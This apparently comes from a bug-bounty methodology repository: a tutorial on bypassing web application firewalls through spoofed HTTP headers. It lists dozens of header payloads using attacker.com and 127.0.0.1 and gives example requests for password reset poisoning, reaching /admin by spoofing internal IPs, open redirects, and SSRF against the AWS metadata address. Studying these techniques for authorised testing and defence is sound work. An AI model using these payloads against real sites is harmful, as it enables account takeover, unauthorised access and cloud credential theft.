# **WAF Bypass Using Headers (Password Reset Poisoning)**

## **Introduction**
Web Application Firewalls (WAFs) are commonly used to filter and monitor HTTP traffic to protect web applications from attacks. However, attackers can bypass WAFs by **manipulating HTTP headers**. One such attack involves **Password Reset Poisoning**, where an attacker leverages forged headers to manipulate the behavior of the application, particularly in password reset functionalities.

This document outlines techniques to **bypass WAFs** using custom headers, including examples of how they can be used in **password reset poisoning** and other similar attacks.

---

## **How Does WAF Header Manipulation Work?**
Many web applications rely on **HTTP headers** to determine a user's origin, session, or intended destination. By modifying these headers, an attacker can:
- Trick the application into believing the request is coming from a trusted source.
- Redirect password reset links to an attacker's domain.
- Bypass security measures by manipulating `X-Forwarded-For`, `Referer`, or `Origin` headers.
- Spoof a legitimate user by injecting headers used for authentication.

Some applications also have misconfigured **reverse proxies**, which trust certain headers to determine the client’s IP address, allowing **internal access** through header manipulation.

---

## **Common Headers Used for WAF Bypass**
Below are the most commonly used headers for WAF bypass and server-side manipulation:

```
X-Forwarded-Host: attacker.com
X-Forwarded-Port: 443
X-Forwarded-Scheme: https
Origin: null
nullOrigin: [siteDomain].attacker.com
X-Frame-Options: Allow
X-Forwarded-For: 127.0.0.1
X-Client-IP: 127.0.0.1
Client-IP: 127.0.0.1
Proxy-Host: 127.0.0.1
Request-Uri: 127.0.0.1
X-Forwarded: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Server: 127.0.0.1
X-Forwarder-For: 127.0.0.1
X-Forward-For: 127.0.0.1
Base-Url: 127.0.0.1
Http-Url: 127.0.0.1
Proxy-Url: 127.0.0.1
Redirect: 127.0.0.1
Real-Ip: 127.0.0.1
Referer: 127.0.0.1
Referrer: 127.0.0.1
Refferer: 127.0.0.1
Uri: 127.0.0.1
Url: 127.0.0.1
X-Host: 127.0.0.1
X-Http-Destinationurl: 127.0.0.1
X-Http-Host-Override: 127.0.0.1
X-Original-Remote-Addr: 127.0.0.1
X-Original-Url: 127.0.0.1
X-Proxy-Url: 127.0.0.1
X-Rewrite-Url: 127.0.0.1
X-Real-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Original-Url:
X-Forwarded-Server:
X-Host:
X-Forwarded-Host:
X-Rewrite-Url:
```

---

## **Practical Attack Scenario: Password Reset Poisoning**
### **Step 1: Identifying the Vulnerability**
- Many web applications send password reset links based on the **Host** or **Origin** headers.
- If these headers are **not validated properly**, an attacker can **poison** the password reset URL.

### **Step 2: Sending a Manipulated Request**
**Example Request:**
```http
POST /reset-password HTTP/1.1
Host: victim-site.com
X-Forwarded-Host: attacker.com
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

email=victim@victim.com
```

### **Step 3: Intercepting the Response**
If the server does not validate the `X-Forwarded-Host` header, it might send a **password reset link to the victim** that looks like this:

```
https://attacker.com/reset?token=abcdef123456
```

Now, when the victim clicks on the reset link, they will be redirected to the attacker's site, where their credentials can be **stolen via phishing**.

---

## **Other Uses of WAF Header Manipulation**
### **1. Bypassing IP-Based Restrictions**
- Some web applications **block access** based on the user’s IP address.
- If the WAF **trusts headers** like `X-Forwarded-For`, an attacker can **spoof their IP** and gain access.

**Example Request:**
```http
GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 192.168.1.100
```
- If `192.168.1.100` is a **trusted internal IP**, access will be granted.

---

### **2. Exploiting Open Redirects**
Some applications use `Referer`, `Redirect`, or `X-Forwarded-Host` to construct redirect URLs.

**Example Request:**
```http
GET /login?redirect=https://victim.com HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```
- The victim is redirected to a phishing page **hosted by the attacker**.

---

### **3. SSRF (Server-Side Request Forgery) Exploitation**
Some applications **fetch remote resources** based on user input. By modifying headers, an attacker can:
- Force the application to fetch **internal resources**.
- Target **AWS metadata services** or other sensitive internal services.

**Example Request:**
```http
GET /api/v1/fetch HTTP/1.1
Host: target.com
X-Forwarded-For: 169.254.169.254
X-Real-IP: 169.254.169.254
```
- If the application fetches the resource using these headers, it could **leak AWS credentials** or **internal system information**.

---

## **Author**
- **[Virdoex_hunter](https://twitter.com/Virdoex_hunter)**
- **[remonsec](https://x.com/remonsec)**

---
*Enhanced and reformatted for HowToHunt repository by [remonsec](https://x.com/remonsec)*
